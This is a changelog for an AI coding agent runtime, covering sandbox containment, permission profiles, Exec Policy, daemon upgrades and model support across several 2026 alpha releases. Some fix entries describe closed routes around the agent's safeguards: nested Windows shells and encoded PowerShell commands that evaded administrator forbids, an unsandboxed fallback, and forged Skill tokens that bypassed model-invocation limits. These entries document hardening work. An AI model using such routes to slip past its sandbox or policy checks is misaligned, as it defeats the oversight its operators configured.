# Changelog

All notable changes to this project will be documented in this file.

> Full history for versions prior to v0.7.0: [CHANGELOG_ARCHIVE.md](docs/CHANGELOG_ARCHIVE.md)

## [0.7.96-alpha.5] - 2026-09-01

### Fixed

- Completed the Windows sandbox concurrency correction without adding a
  machine-global command lock or queue. Every command owns its runner pipes,
  exact process handle, creation-time kill-on-close Job, cancellation state,
  and terminal evidence; cancellation is observed before synchronous launch
  preparation and all abort paths finish Job drainage before host exit.
- Removed the remaining startup/termination race: a command that has not
  published a nonce-bound Resume record may use the one-second pre-start
  cleanup path, while a Resume discovered during that window extends the wait
  to the normal terminal-attestation budget instead of being killed early.
- Restored fail-closed admission ordering in the Windows native host: policy
  boundary validation (protected control-state overlap, restricted-account,
  and terminal-record checks) runs before the host consumes controller
  bootstrap input, so a forged or policy-opaque request is rejected with its
  structured error instead of stalling until the operation deadline. Valid
  commands still observe termination control before setup and launch.
- Treated the Runtime daemon `0.0.0` development sentinel as having no
  provable SemVer ordering. Such an owner attaches in place instead of being
  classified as an older daemon for the version boundary, so SDK test and
  development harnesses reconnect without a forced replacement, while every
  documented versioned-capability boundary, the never-downgrade guard, and
  the non-SemVer fail-closed path are unchanged.
- Restored the portable shell adapter's protected-read gate that the
  sandbox-first routing restructure dropped: on POSIX, a model Bash read
  carve-back that targets the trusted text native state roots fails
  preparation with the structured protected-state error before any broker
  spawn, matching the SDK executor and Windows control-state gates.
- Made content-addressed Windows native artifacts self-healing on execution.
  A missing new-version artifact is published atomically, concurrent publishers
  converge without a global mutex, and ordinary commands verify stable file
  identity, physical cache containment, and content hash without launching a
  PowerShell verifier. Owner/DACL construction remains part of atomic
  publication; `sandbox doctor` remains verify-only.
- Made Runtime daemon upgrades version-safe. An alpha.5 execution client
  replaces an idle older daemon on first connection, leaves a busy older daemon
  running with a recoverable error, never downgrades a newer daemon, and never
  mutates an owner whose version is not comparable SemVer.
- Completed sandbox self-healing at the process facts that own it. Failed
  target-start/controller generations roll out of reuse without stopping live
  holders; an unconfirmed process remains in fixed-port capacity accounting
  until `close`, while spawn failure without an OS process cannot leak capacity.
  Native-host bootstrap delivery failure does not blame or retire a healthy
  shared broker. No command lock, queue, or new permission restriction was
  introduced.
- Made simultaneous and staggered npm-linked/`kodax -r` upgrade clients
  converge on one idle incompatible-daemon replacement, including a peer that
  attaches between preflight and settlement or after the durable prepared
  ticket but before its revision CAS. One authenticated follower resumes that
  exact durable ticket after detaching while the first client and any other
  followers only observe the owner change; active or untrusted work remains untouched.

## [0.7.96-alpha.4] - 2026-08-30

### Changed

- Replaced the legacy Plan/Edits/Auto[RULES]/Auto[LLM] permission shape with
  four canonical profiles: Plan, Edits, Auto[LLM], and Full Access. Legacy
  `auto-in-project` and Rules selections migrate to Auto[LLM]; `/auto-engine`
  and auto-rules loading are removed.
- Made shell containment sandbox-first. Successful sandbox execution is silent;
  only a proven pre-start denial or unavailable backend reaches Exec Policy and
  the Edits user boundary or Auto reviewer. Started or uncertain commands are
  never replayed, and an approved boundary has at most one host attempt.
- Added JSONC Exec Policy (`~/.kodax/exec-policy.jsonc`, plus explicitly trusted
  repository policy) with deterministic `allow`/`prompt`/`forbidden` prefix
  rules, strictest-match evaluation, administrator forbids, narrow critical
  fallbacks, and the non-executing `kodax execpolicy check` command.
- Auto review now runs only at an exact host boundary, uses fixed 90-second and
  one 180-second retry deadlines, fails closed on reviewer infrastructure
  errors, stops a turn after the bounded denial thresholds, and never opens an
  automatic approval prompt. A later informed natural-language instruction is
  reviewed again.
- Aligned the workspace sandbox with normal development use: inherit the host
  environment except fixed KodaX/Electron execution controls, allow external
  network and system temporary writes, permit broad reads including Agent Home,
  credentials, and global Git configuration, and stop disabling global Git.
  The obsolete `sandbox.envPass` input is inert.
- Advanced the public Runtime contract to `runtimeAutoModeGuardrail:5` and
  `sharedSessionSettings:2`, with exact canonical/input permission types,
  host-owned Exec Policy/Auto-review options, ACP mode exports, and safe daemon
  replacement so an alpha.4 client cannot silently attach to alpha.3 routing.
  An idle older daemon is replaced automatically; a busy older daemon is left
  intact and reported as a recoverable upgrade boundary, while a newer daemon
  is never downgraded by an older client. A non-SemVer/unknown daemon version is
  likewise left untouched because its ordering cannot be proven.
- Synchronized README, PRD/HLD/DD/ADR, feature and release records, public
  configuration/SDK guides, config templates, package contents, test guide,
  and `kodax_manual` with the same sandbox-first contract.

### Fixed

- Removed the shell-tool fallback that could execute unsandboxed after native
  sandbox bootstrap and termination both failed. The boundary is now explicit,
  policy-reviewed, and single-attempt.
- Closed administrator Exec Policy bypasses through nested Windows shells.
  `cmd /C` and `/K`, PowerShell command selectors/abbreviations, and strict
  UTF-16LE `EncodedCommand` payloads are recursively evaluated; invalid or
  policy-opaque nested execution fails closed where an administrator forbid
  must remain absolute.
- Corrected the Windows shell concurrency regression at its setup/admission
  boundary. Protocol 9/setup generation 9 removes every machine-global ACL
  mutex from ordinary admission. Each canonical root receives one
  policy-independent stable ACE set for `AllowRead`, `AllowWrite`, and
  `DenyWrite`; the command token activates only its exact capabilities. Missing
  ACEs converge additively with `SET_ACCESS` plus DACL readback, without
  revocation, a cross-process target mutex, or a serialized command lifetime.
  This removes both the observed 240-second global-mutex stall and the
  deterministic 75-second failure caused by applying a separate five-second
  mutex wait to each of 15 roots. Generation 8 remains the proof boundary for
  the one-time legacy ACL removal; generation 9 upgrades a healthy account in
  place, preserving its SID/group and filesystem nonce without replaying that
  cleanup. Setup first publishes a protected non-ready `installing` marker; the
  elevated parent validates that exact digest-bound marker and synchronously
  converges NUL compatibility plus profile read capabilities. The caller
  publishes the ready marker only after the parent succeeds. No helper or
  migration overlaps ordinary admission, system TMP is not prewarmed, and
  `sandboxRuntime` advances to `9`,
  so a newly linked CLI replaces an idle daemon that still carries the setup-8
  ACL behavior and refuses a busy one instead of mixing generations.
- Fixed first-launch policy construction when a custom `KODAX_HOME` is below the
  system temporary write root. KodaX now creates only its fixed protected
  `sandbox-runtime`, `native-text-state-v1`, `runtime`, `processes`, and `learned`
  directories before passing them as Windows deny-write roots, so native
  validation never rejects a missing host-owned root. This adds no lock, queue,
  ACL mutation, or command-lifetime coordination.
- Preserved failed managed-turn history across `kodax -r`. The run-end failure
  path now commits the already-rendered Assistant summary, Sidecar Verifier
  verdict, and terminal error in their original order. The JSON load guard also
  accepts the typed `sidecar` item, including a save/load/save/load round trip;
  a first failed turn containing only this presentation history remains
  resumable and visible in the session index. If its first durable write fails,
  the retry reuses the already-staged snapshot instead of appending the
  Assistant/Sidecar/error batch a second time.
  Sessions already overwritten by an older build cannot reconstruct text that
  was never committed to their session file.
- Moved control-directory provisioning and legacy ACL recovery out of the
  command hot path. Setup owns those machine changes. Native executable images
  use a content-addressed self-healing boundary instead: ordinary admission
  verifies stable file identity, physical cache containment, and the protected
  hash locally, without a PowerShell subprocess. A newly installed or
  `npm link`ed hash is atomically published once if and only if its destination
  is missing; publication constructs and verifies owner/DACL state. Concurrent
  publishers share the immutable winner without a global mutex, and corrupted
  content remains fail-closed rather than being silently repaired. Protocol 9
  requires a hash-bound protected
  setup marker, and the native host holds its non-delete-sharing handle until
  the target's `Started` record is durable. Setup therefore cannot rotate a
  generation across an admitted target-start window. Protocol-8 and older marker
  retirement is setup-only and does not impose the former 301-second admission
  drain; a healthy fixed account is reused so existing sessions keep their
  identity while the new protected marker is published.
- Closed the remaining native-host termination gaps. The host consumes its
  bootstrap and begins cancellation observation before synchronous ACL/desktop
  preparation, binds the runner process handle before protocol decoding, and
  waits for the winning abort path to durably publish Job-drain evidence before
  exiting. Before the nonce-bound Resume record exists, confirmed host-tree
  termination proves that no target ran and avoids an extra 12-second terminal
  attestation wait.
- Removed the cross-process command-lifetime filesystem-effect coordinator from
  Bash, trusted text tools, and worktree lifecycle. Same-file text mutations
  retain their narrow kernel/CAS ordering; same-path worktree calls retain a
  process-local queue, while different worktrees and Runtime processes use
  Git's own locks. Deprecated lease exports remain inert for source/ABI
  migration and old coordinator files are ignored, so stale alpha state cannot
  block a new KodaX process.
- Made each native shell independently own its request, pipes, restricted
  token, Job, resume/started records, and terminal proof. Windows per-command
  `denyRead` now fails closed as structured `unsupported_policy` before doctor,
  setup, DACL mutation, or target start: `WRITE_RESTRICTED` does not enforce a
  restricting capability SID for reads, so claiming containment was incorrect.
  Consequently, isolated Skill Script execution on current native protocol 9
  is POSIX-only; `createAsrtSkillScriptRunner` rejects Windows as unavailable
  instead of weakening its required per-command `denyRead` policy.
  The field remains wire/API compatible, and setup alone can retire legacy
  execution receipts and ACEs.
  Terminal/termination proof failures now propagate through cleanup instead of
  being reported as a successful command. Crash-left atomic-publication staging
  files are removed only after an exact dead-PID and age proof. Network brokers
  are reused by exact authority, retire failed readiness attempts, and use the
  bounded five-broker pool without a one-second idle teardown race. A broker
  remains referenced while starting or leased and detaches from the Node event
  loop only when idle, preventing independent Runtime processes from exiting
  with an unsettled top-level command.
- Closed the controller-loss reuse race without waiting for unrelated commands.
  Any broker generation implicated by target-start or terminal-proof failure is
  removed from the reusable map immediately; existing leases finish on that old
  generation, while the next same-authority command creates a fresh generation.
  Detached generations remain in live-capacity accounting until their process
  exits, so rolling replacement cannot overrun ASRT's fixed proxy ports. No
  holder is stopped and no lock or queue is added. A caller-local timeout or
  abort still leaves a healthy shared startup intact.
- Capped each Windows native startup/control phase at 15 seconds without
  replacing the caller's command deadline, matching Codex's phase-local runner
  startup bound. If termination then proves that the nonce-bound Resume record never
  existed, Bash reports pre-start unavailability through the existing permission
  boundary; started or uncertain commands remain non-replayable.
- Made simultaneous npm-linked clients self-heal one idle incompatible daemon.
  Token-authenticated temporary upgrade identities elect one inventory leader;
  followers detach and reconnect after the existing fenced replacement. This
  adds no ordinary command lock, queue, permission restriction, or daemon kill
  of active work.
- Closed prepared-invocation leaks in foreground Bash and the public sandbox
  SDK. Generation validation now runs immediately before native host spawn;
  synchronous spawn failure and other proven pre-start exits remove the native
  request and release the broker lease exactly once. Git Job-binding failure
  keeps durable child tracking until process-tree drain is proved by background
  recovery instead of unregistering an unknown tree.
- Preserved an already wrapped Windows `cmd /S /C` command tail across the
  native runner boundary. The runner no longer adds a third quote layer that
  made a successfully attested background shell immediately exit with “path
  not found” before running its requested program, including when a quoted
  executable is followed by an unquoted final argument.
- Legacy execution-scoped denyRead receipts are read only by explicit setup for
  one-time migration. Ordinary admission never scans or repairs them.
- Native requests also stop adding the protected artifact cache as a redundant
  `denyWrite` root; setup generation 8 removes only provable obsolete
  sandbox-account guards and preserves ambiguous administrator ACLs. Real
  Windows coverage holds one command active for up to 120 seconds while a
  second Runtime must start and complete in under 15 seconds, and exercises
  stale control staging, broker pressure, timeout/Job drain, and parallel
  workspace writes.

### Removed

- Removed the public `/repl` export `allowsAcceptEditsClassifierFallback` with
  no replacement. The Runtime now owns the only shell-boundary route;
  embedders must not install a second Accept Edits classifier fallback.
- Removed the stale public `createAgentHomeShellBoundaryGuardrail` helper and
  its options type. It imposed a second Agent Home/opaque-shell block outside
  the Runtime-owned sandbox-first route and has no replacement.

## [0.7.96-alpha.3] - 2026-08-29

### Added

- Added the v2 scoped Provider credential broker for keychain-only manual
  compaction, lazy multi-Provider routing, internal Agent turns, detached
  Workflows, and secret-safe effective-config provenance. Added bounded daemon
  client inventory for shared-daemon diagnostics.

### Changed

- `0.7.96-alpha.3` ships this change. Shared-daemon native, constructed, and
  workflow Agent turns now require an explicit scoped
  credential binding; External Agents remain on their independent
  `credentialRef` plane. Restart an older daemon before using v2 bindings.
- Agent authority wire records are closed and reject unknown fields. Existing
  host extension data must remain under `metadata`.

### Fixed

- Internal side queries (auto-mode classifier, fallback verification) now
  resolve the lowest enabled reasoning effort for models that cannot disable
  thinking, instead of requesting a disabled `none` effort through its alias;
  a profile with no fully usable enabled effort keeps the side query enabled
  through an explicit `auto` effort.

## [0.7.96-alpha.2] - 2026-08-28

### Fixed

- Restored the Windows boot-identity PowerShell resolution helper that the
  FEATURE_295 cleanup deleted while its last caller stayed (Issue 325). On
  v0.7.96-alpha.1 every Windows exit settlement crashed with
  `windowsAclPowerShellExecutable is not defined` and left sandbox cleanup
  `unverified`. v0.7.96-alpha.1 is broken on Windows; upgrade to
  v0.7.96-alpha.2.

## [0.7.96-alpha.1] - 2026-08-28

### Fixed

- FEATURE_296 replaces the local tool-result capacity hard gate with
  capacity-debt admission plus a bounded recovery ladder (ADR-067). Executed
  `tool_use`/`tool_result` pairs always commit; an over-budget batch records
  `capacityDebt` metadata with its artifact pointer instead of aborting the
  Run. The next iteration's compaction relieves the debt (a still-over
  compacted transcript commits best-effort with `stillOverCapacity`), the
  output reserve shrinks floor-bounded (3000) while over capacity — both in
  the post-compaction judgment and on the wire-level request — and an
  irreducibly oversized fresh user input degrades to a preview head plus a
  run-scoped volatile pointer the model pages in slices, on the request copy
  only; the full input stays behind an unguessable in-memory capability that
  is removed when the Run ends and leaves no filesystem residue. A
  transient compaction-summarizer failure fails open until the existing
  circuit breaker opens; repeated failures or reducible still-over-capacity
  results then produce a typed capacity terminal instead of repeatedly
  invoking the summarizer. An irreducibly oversized fresh input does not spend
  that summary-failure budget, and paging its transient capability cannot be
  re-spilled into the global tool-result store. Provider output-token and
  reasoning self-heal state is likewise request-local, so concurrent Runs
  sharing a cached provider cannot alter one another. Runner final recounts
  stamp capacity debt even when only the final
  assembled batch crosses the budget. Local capacity terminals now classify as
  `failureKind: "context_capacity"` with structured `contextTokens`
  (`required`/`available`) — never masked as a provider credential failure,
  classified by isolated class identity rather than message text — and the
  daemon schema plus resume round-trip preserve the new fields.

- Classified Runtime failures now expose one credential-safe `failureDetail`
  across failure events (or settlement `run.updated`), Run result/status, and
  Session diagnostics. The stable
  KodaX `providerErrorCode` is kept separate from bounded upstream codes and
  request metadata; KodaX-owned `safeMessage` templates never copy provider
  response text, credentials, prompts, headers/bodies, URLs, local paths,
  stacks, or raw errors.

- Unified text diffs now use budget-capped anchored LCS matching, grouping
  replacement blocks as removals followed by additions without duplicating
  shared context. REPL diff context stays legible, and add/remove backgrounds
  span the full terminal row while preserving selection highlighting.

- FEATURE_295 separates cross-platform trusted text transactions from shell
  containment. On Windows, Linux, and macOS, `write`, `edit`, `multi_edit`, `insert_after_anchor`, and
  `undo` no longer enter ASRT/workspace-session/helper state; final identity,
  per-slot kernel locking, revision CAS, flushed atomic replacement, and
  stale-safe undo are enforced in the trusted Runtime; Unix uses a fixed
  per-UID coordination root shared across Runtime config homes, a separate
  protected addon cache, descriptor-bound loading, no-follow walking,
  kernel `flock`, file/parent `fsync`, atomic rename, and ownership/mode/xattr/
  Linux inode-flag and macOS extended-ACL/file-flag preservation.
  Atomic replacement is now an explicit commit point: Windows performs no
  fallible cleanup afterward, while Unix post-rename durability/rollback
  uncertainty carries a complete receipt as `text_mutation_commit_uncertain`
  and forbids blind retry. Windows preserves effective DACL entries; the
  filesystem may canonicalize DACL inheritance/protection control during
  replacement. Linux ZFS remains fail-closed until its case and
  normalization semantics can be proven from a descriptor. Unix commits now
  derive their namespace slot before locking without reading the target; all
  target bytes and identity are observed under the slot lock, so a concurrent
  atomic replace becomes the intended stale result instead of a false hard-link
  rejection (Issue 320).
  The Windows native
  shell runner keeps framed stdin/process containment but drops the
  command-lifetime filesystem-effect owner, uses a nonce-bound per-policy private desktop,
  and suppresses final-target modal faults while preserving exit status, allowing independent policies,
  Sessions, and Runtime processes to execute concurrently. `CloseStdin` no
  longer closes the host control stream: cancellation and timeout send a
  distinct `Terminate` frame over authenticated directional control/event
  pipes, wait for the runner to prove the Job empty through a nonce-bound
  terminal record, and preserve the original stop reason; generic PID-tree
  cleanup is emergency-only. The incompatible native shell protocol advances
  to v5. Request and terminal state now lives under a verified no-reparse,
  protected host/SYSTEM-only control directory. SDK policy validation and the
  native host independently reject overlapping allow roots and deny roots at or
  below this boundary before ACL authorization or target creation. Doctor is
  verify-only; explicit setup creates missing state or repairs only an empty,
  no-reparse, host-owned direct child after proving the sandbox SID idle.
  Packaged Electron Node targets consume and scrub `ELECTRON_RUN_AS_NODE` before
  target or descendant code loads. The incompatible
  authority split advances Windows `sandboxRuntime` to v6 so clients cannot
  silently reuse a daemon that still implements the v5 graph. Existing
  installations perform a one-time idle-account SID rotation through
  `kodax sandbox setup`; native shell admission validates the resulting
  machine protocol/SID generation before broker launch. Both native artifacts
  are checked against an embedded manifest and loaded/executed only from a
  protected content-addressed store whose immutable-image verification remains
  shareable across concurrent Runtime processes. Packaged Electron hosts now
  resolve only explicitly unpacked physical native files before applying those
  checks; the release smoke asserts both KodaX native files and the Windows ASRT
  runner are present under `app.asar.unpacked` (Issue 319). Linux/macOS shells remain
  per-command ASRT bubblewrap/Seatbelt calls with no KodaX workspace-session
  owner (Issues 304–306). Public POSIX sandbox calls now require target-start
  attestation over a broker-only bounded control pipe. A proven pre-target exit
  returns structured `backend_launch_failed`; a missing, malformed, or
  mismatched control frame returns `execution_uncertain` and forbids blind
  retry instead of misreporting that the command did not run. The ASRT-owned
  runner's pre-main creation window is
  recorded separately as Issue 307; final targets remain creation-time Job
  contained. Runner loader/pre-main modal faults are part of that same upstream
  bootstrap residual; it does not reach trusted text tools.

- Bundled Windows binaries (Bun `--compile`) no longer resolve the Windows
  sandbox runtime binary onto Bun's virtual `B:\` drive: the build ships a
  `vendor/srt-win/<arch>/srt-win.exe` sidecar next to the executable,
  `resolveSrtWinSourcePath()` prefers it in bundled builds, and
  `kodax sandbox setup` installs through the prepared runner's resolved
  descriptor instead of the library's module-relative lookup (Issue 303).

- Windows ASRT import now accepts a package-store hardlink only in a bundled
  build, after a handle-bound bounded read matches the embedded release
  SHA-256. Development manifests and sources remain single-link. KodaX still
  copies it into the protected content-addressed cache, whose executable must
  remain single-link, ACL-protected, and hash-correct. Valid package layouts no
  longer make model-issued Bash silently use the declared normal-permission
  fallback (Issue 317). The repository now declares npm as its package manager;
  alternate local package metadata remains outside the project contract.

- Windows native shell admission no longer writes traversal ACEs to every
  allow-root ancestor. The restricted target's enabled traverse privilege
  reaches an exact capability-protected root without directory-list/content
  authority, while explicit deny-ancestor conflicts remain rejected. This
  avoids unbounded profile-DACL propagation and restores cold `%TEMP%` shell
  startup within the existing deadline (Issue 318).

### Added

- Custom providers can opt into image / vision input with a single
  `"imageInput": true` field (typical for self-hosted multimodal models on
  vLLM / SGLang OpenAI-compatible endpoints, e.g. Qwen-VL). The flag forces
  `capabilityProfile.multimodalSupport: "image-input"` on every surface —
  provider instance, keyless capability queries, media routing, and the
  provider-policy gate — so image artifacts pass `MODEL_INPUT_UNSUPPORTED`
  validation and are forwarded as standard `image_url` blocks. Leaving it
  unset changes nothing; text-only models keep the pre-send rejection.
- DeepSeek vision model `deepseek-v4-flash-vision-exp` is registered on the
  `deepseek` provider (selectable via `/model`). It reuses the existing
  OpenAI-style `image_url` wire path, so pasted/read images are forwarded on
  user turns, while `deepseek-v4-flash` / `deepseek-v4-pro` stay text-only via
  per-model media routing (ark-coding mixed-capability convention). Cost
  accounting uses flash pricing — images bill as size-derived tokens (≤384 per
  image) at text-token rates.
- `glm-5.3-flash` (published 2026-08-26) is registered on `zhipu`,
  `zhipu-coding`, and `zai-coding` (selectable via `/model`). It is the first
  natively multimodal GLM: image input is routed and validated end-to-end
  (Anthropic-compat image blocks on the coding routes, `image_url` on the
  public route), video stays provider-native-unwired, and file input remains
  unwired end-to-end. 1M context, 131K output, cannot disable thinking (same
  `zai-glm-5.3` effort mapping as `glm-5.3`), and priced from the official
  announcement at $0.15 input / $0.50 output / $0.03 cached input per million
  tokens. Defaults stay on `glm-5.3`; `glm-5.3` / `glm-5.2` remain text-only
  image-unsupported.
- Release publication now ships CI-built bytes. The npm package embeds
  prebuilt native authorities for five platforms, which only the Release
  workflow's cross-platform matrix can assemble, so the universal tarball is
  built by its `npm-package` job and attached to the GitHub Release as
  `kodax-ai-kodax-<version>.tgz` + `kodax-ai-kodax-npm.sha256`. `node
  scripts/release.mjs` (no arguments) downloads those exact assets, verifies
  the sha256 checksum and sidecar audit, and publishes them; on a local
  machine `--pack-only` produces a host-only LOCAL TEST TARBALL that keeps
  `private: true` (npm refuses to publish it) for `npm install <path>` SDK
  consumer testing. The asset download honors `HTTPS_PROXY` / `https_proxy`
  through undici's `ProxyAgent` (Node's global fetch ignores proxy env vars,
  so proxy-only machines previously failed with an opaque connect timeout);
  network-layer download errors now surface the underlying cause.

---

## [0.7.95] - 2026-08-23

### Fixed

- KodaX-created linked worktrees now join the Session's exact sandbox policy
  before the tool returns them to the model. The Runtime persists that bounded
  root set, revalidates each Git common-directory backlink on later Runs, and
  revokes it after worktree removal. A background Bash process in such a
  worktree can therefore coexist with `write`/`edit` without authorizing
  arbitrary sibling directories or weakening namespace fences. Atomic root
  updates remain authoritative over stale full-Session snapshots, so an old
  non-empty list cannot overwrite a newer registration or resurrect a revoked
  root. Older Sessions migrate only retained successful `worktree_create`
  evidence after the same Git relationship is revalidated. Session roots that
  are real Git submodules use their byte-bounded `core.worktree` backlink as
  the repository identity, so creating a linked worktree from a submodule does
  not regress while forged `.git/modules` paths remain rejected.
- Windows sandbox cleanup now keeps every ACL-mutating helper and command owner
  in a recoverable machine-global Job, persists only self-healing recovery
  tickets, and retries process drain, ACL reset, and filesystem-effect fence
  release in the background without blocking unrelated work. Runtime shutdown
  also verifies exact daemon and supervisor process generations, so PID reuse or
  an interrupted exit cannot strand a manual-recovery requirement. Same-boot
  `unconfirmed-owner` tickets are retried automatically and cleared only after a
  sandbox-user SID probe proves the account idle; probe failure remains
  fail-closed and diagnosable without blocking non-sandbox work. Text cleanup
  recovery records each completed phase and retains a consumed
  sandbox attestation across retries. Transient workspace cleanup, policy-reset,
  or outer lease-release failures therefore retry without losing evidence or
  repeating already completed phases.
- Learning-store coordination now reclaims a stale zero-byte owner lock left by
  a crash between exclusive creation and owner-record publication, plus stale
  malformed or truncated owner records, using an unchanged-byte/stat compare
  before deletion; valid live owners and successor records remain protected.
  Fullscreen TUI
  teardown also performs an exit-safe terminal restore from the renderer's
  guaranteed unmount boundary, including when final rendering or React cleanup
  throws; terminal write backpressure no longer disables cleanup (Issue 301).
- Explicit Skill execution now keeps the exact user query as the canonical
  transcript/title input while carrying expanded instructions and host hook
  context only in the execution overlay. Multiple known Skill references are
  rejected consistently in Classic, Ink, immediate, and queued paths, and a
  failed or malformed `PreToolUse` hook fails closed instead of authorizing the
  guarded tool. The shared command-dispatch check also covers leading
  `/<skill>` and legacy `/skill:<name>` forms before either Skill executes.
- Terminal Run persistence failure now converges to `unknown` before the public
  result resolves. If neither status nor event journal can publish that state,
  active `sessions.observe()` consumers are invalidated and must resnapshot,
  preventing a stale terminal projection. The additive SDK contracts advance to
  `runtimeExitSettlement:2` and Windows `sandboxRuntime:5`; release/version
  assignment remains a maintainer step. If terminal status commits but its
  status-lock cleanup reports failure, the exact committed proposal is reread
  and its terminal event is still published once; a different authoritative
  status is never overwritten or republished.
- The coding runtime now delays its public `onComplete` completion signal until
  extension completion and asynchronous result finalization have produced the
  authoritative `KodaXResult`. A2A responses and other completion subscribers
  can no longer observe an empty successful answer before the coding result
  settles, including the lost-executor-Promise fallback path (Issue 302). A
  completion observer that throws after finalization is diagnosed without
  rewriting the persisted terminal facts.

---

## [0.7.94] - 2026-08-21

### Changed

- Runtime capability negotiation and pre-start SDK facts now advertise
  `conversationHistory:2` only when
  ordinary history is topology-transparent across managed context and direct
  clone provenance is preserved. Embedders can require v2 to reject stale daemon
  processes that still expose the legacy projection contract. Auto-start replaces
  an idle v1 daemon and fails closed while an incompatible daemon is busy.
- Skill invocation now has an explicit source contract across CLI, REPL, SDK,
  Runtime, Workflow, and child-Agent paths. Every enabled Skill remains
  explicitly invocable; `disable-model-invocation: true` only removes it from
  model discovery and blocks the model `skill` tool. The legacy
  `user-invocable` field remains parse-compatible but is no longer an execution
  permission.
- The public README files, package SDK guides, Embedder Guide, public sandbox
  guide, HLD/DD, `kodax_manual` commands/skills topics, skill-creator
  authoring contract, and Runtime SDK type comments now document the same Skill
  catalog, slash-argument, provenance, child-delegation, Run-settlement,
  typed-disconnect, safe-failure, and exact-`runId` recovery contracts.

### Fixed

- Sandboxed text-mutation helper stdin failures are now observed by the
  operation Promise instead of escaping as process-level stream errors.
  Linked-worktree and submodule relationship files are read through strict
  byte bounds before external Git metadata earns sandbox trust.
- Explicit Skill runtime policy now diagnoses invalid `allowed-tools` entries
  and malformed hook JSON. `PostToolUse` still runs when an embedder's base
  result observer throws, while preserving that observer failure for its
  caller.

- Scheduled Runtime daemon shutdown now rejects the public host lifecycle when
  cleanup fails, while retaining an internal rejection observer so embedded
  hosts do not emit an unhandled rejection. CLI stop persists and reports the
  matching failed shutdown outcome instead of claiming a safe stop.
- Worktree Git process-tree drain now returns a bounded error when completion
  remains unprovable, while leaving the namespace lease fail-closed. Successful
  `insert_after_anchor` mutations also refresh the content-hash cache so the
  next edit is not falsely rejected as stale.
- Windows sandbox Git trust now removes ASRT wildcard `safe.directory` entries
  even when no authorized root survives, rejects malformed `GIT_CONFIG_*`
  shapes, and generates broker and bundled rewriting from one implementation.
  Linked-worktree metadata must prove its backlink before the main `.git` earns
  read trust; repository-bearing metadata read roots join the exact trust set
  (Issue 300).
- Long-running and background Bash processes no longer block Runtime `write`,
  `edit`, `multi_edit`, `insert_after_anchor`, or `undo` solely because a shell
  lease is alive. Those tools now perform both snapshot and identity-aware
  optimistic compare-and-write through the same ASRT workspace policy, while
  preserving same-path FIFO ordering. Sandbox failure for a covered workspace
  target fails closed; non-workspace targets, standalone/other host filesystem
  sinks, incompatible Windows ACL policies, and worktree namespace changes
  retain their existing safety fences. Runtime non-workspace host writes also
  reject symlink/junction-routed and hard-linked targets inside that fence.
- Sandboxed text backup authority is minted from the helper's opened file
  identity, preserving stable alias undo without trusting concurrent host
  `realpath`. A permanently rejected Windows Job drain proof now reports the
  error and keeps the worktree namespace fence fail-closed instead of polling
  a settled promise forever or trusting a root-only process check.
- Sandboxed text mutations now reject hard-linked targets at snapshot and
  commit, reject canonical backup identities outside the workspace capability,
  and preserve the winning undo record when two lexical aliases race. POSIX
  workspace-session startup no longer conflicts with unrelated live shell
  policies because its sandbox policy is process-local; Windows retains its
  shared-account ACL transition fence.
- Runtime start omits the concurrent text-mutation sandbox when the workspace
  directory does not exist yet, instead of aborting option construction.
- Run terminal convergence now observes every finalization rejection. A durable
  terminal status remains authoritative if only event publication fails; when
  neither terminal record can be persisted, the public Run resolves as
  `unknown` with `run_settlement_not_persisted` and the Session execution fence
  remains closed instead of escalating the rejection to the daemon process.
- Workspace-sandbox and managed-child emergency termination promises are now
  observed and retain fail-closed diagnostics when process-tree drain cannot be
  confirmed. Daemon transport disconnects expose typed connection facts, reject
  oversized outbound frames before socket write, and credential-safe terminals
  preserve a bounded `failureKind` without persisting provider error text.
- Explicit `/<name>` and `/skill:<name>` tokens now resolve at the query head or
  middle, preserve suffix arguments, and use the same host-owned expansion,
  hooks, and permission pipeline in Classic, Ink, non-interactive CLI, queued
  follow-ups, isolated Runtime, and terminal SDK helpers. Low-level
  `SkillRegistry.invoke()` remains an explicit load/resolve primitive; SDK hosts
  that need lifecycle hooks and permission admission use
  `prepareInvocationExecution`. Expanded Skill content enters the provider
  request exactly once.
- A structured host `skillInvocation` now propagates an active explicit Skill to
  Workflow children, while model-authored child objectives must use the
  governed model tool and cannot bypass `disable-model-invocation` by writing a
  slash token or forged Skill block.
- The publish-tarball regression test now honors the standard `npm_execpath`
  supplied by npm-compatible test launchers. The Windows optional-ASRT test
  verifies the additional unrepresentable-path fallback without assuming that
  local ASRT containment is always available.

---

## [0.7.93] - 2026-08-19

### Fixed

- Runtime exit settlement no longer spends the 170-second orderly Windows
  daemon-exit window after the exact owner has already persisted a terminal
  `failed` shutdown outcome. Settlement observes that durable evidence while
  waiting for process exit and enters the existing exact PID/start-identity,
  Job-containment, and ACL-recovery path immediately. Slow cleanup without a
  terminal failure still keeps the full budget; POSIX behavior is unchanged.
- Runtime exit settlement now recovers Windows sandbox ACL markers from multiple
  owners only after a changed boot identity and a machine-lock recheck prove
  that every marker has a canonical non-current boot identity. Recovery is
  durably recorded with the recovery boot before marker removal. A further
  reboot repeats native recovery before clear; same-boot, mixed, unreadable, or
  identity-free markers remain fail-closed, and the path never enters sandbox
  provisioning or elevation.
- Anthropic and OpenAI SDK abort wrappers whose runtime `name` remains `Error`
  are now recognized by their lazily loaded `APIUserAbortError` class identity
  when the request signal is already aborted. Each SDK load is isolated, so a
  missing or broken sibling package cannot replace the original error.
  Managed Runtime Stop therefore retains its trusted interrupted terminal
  cause before run-scoped credential redaction, without reclassifying
  independent same-message Provider failures.

---

## [0.7.92] - 2026-08-18

### Fixed

- The shared filesystem-effect coordinator now identifies queue ownership by an
  operation token, refreshes live waiters, and reclaims abandoned same-process
  tickets only after the ticket heartbeat is stale and no exact coordinator lock
  is owned. A durable release marker lets a later caller remove a settled
  direct-effect owner even while the long-lived daemon PID remains alive.
- File-lock release handoff is retryable: the owner handle is closed once, and
  a release marker is written only when owner cleanup cannot finish, so a later
  waiter can recover instead of stalling on a half-released lock.
- Managed Runs commit the canonical Session before reporting managed
  completion. Repository-intelligence and managed-task file projections run as
  best-effort maintenance, and Runtime no longer treats the managed
  `onComplete` cleanup callback as terminal authority ahead of the executor
  Promise. `KodaXResult.managedTask` is the terminal core snapshot; maintenance
  may add repo-intelligence evidence to the eventual on-disk projection without
  mutating the already-returned result.
- Resume reconstruction treats canonical Session `messages` as the only source
  of ordinary conversation. A sparse, stale, or slash-command-only `uiHistory`
  cache can overlay timestamps, compact labels, icons, and sanitized tool cards,
  or append display-only entries such as `/quit`, but it can no longer hide
  user/assistant history or evict the 150-item / 50-round canonical window.
  Presentation-only `agent-completed` and legacy `task-completed` events stay
